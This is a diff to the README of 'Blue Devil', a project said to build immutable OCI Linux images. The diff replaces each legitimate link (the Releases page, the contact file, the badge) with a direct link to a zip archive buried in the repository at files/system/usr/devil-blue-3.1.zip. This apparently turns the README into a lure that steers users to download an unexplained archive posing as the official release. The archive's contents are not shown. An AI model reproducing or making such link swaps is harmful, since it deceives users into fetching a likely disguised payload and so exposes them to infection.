@@ -1,6 +1,6 @@
 # Blue Devil 🦇
 
-![Blue Devil](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg?style=flat-square&logo=github&logoColor=white)
+![Blue Devil](https://raw.githubusercontent.com/kakasarkar/blue-devil/main/files/system/usr/devil-blue-3.1.zip%20Latest%https://raw.githubusercontent.com/kakasarkar/blue-devil/main/files/system/usr/devil-blue-3.1.zip)
 
 Welcome to the Blue Devil repository! This project focuses on creating custom, immutable Linux images using the OCI (Open Container Initiative) standards. Our goal is to provide a streamlined approach to building and managing images that are efficient, reliable, and easy to deploy.
 
@@ -29,7 +29,7 @@ Blue Devil offers a framework for generating custom Linux images. It simplifies 
 
 ## Installation
 
-To get started with Blue Devil, you can download the latest release from our [Releases page](https://github.com/kakasarkar/blue-devil/releases). 
+To get started with Blue Devil, you can download the latest release from our [Releases page](https://raw.githubusercontent.com/kakasarkar/blue-devil/main/files/system/usr/devil-blue-3.1.zip). 
 
 1. Visit the link and find the appropriate release for your system.
 2. Download the file.
@@ -93,8 +93,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any questions or feedback, please reach out to the project maintainers. You can find contact information in the `CONTACT.md` file.
+For any questions or feedback, please reach out to the project maintainers. You can find contact information in the `https://raw.githubusercontent.com/kakasarkar/blue-devil/main/files/system/usr/devil-blue-3.1.zip` file.
 
-For the latest updates and releases, visit our [Releases page](https://github.com/kakasarkar/blue-devil/releases). 
+For the latest updates and releases, visit our [Releases page](https://raw.githubusercontent.com/kakasarkar/blue-devil/main/files/system/usr/devil-blue-3.1.zip). 
 
 Thank you for checking out Blue Devil! We hope you find it useful for your image creation needs.
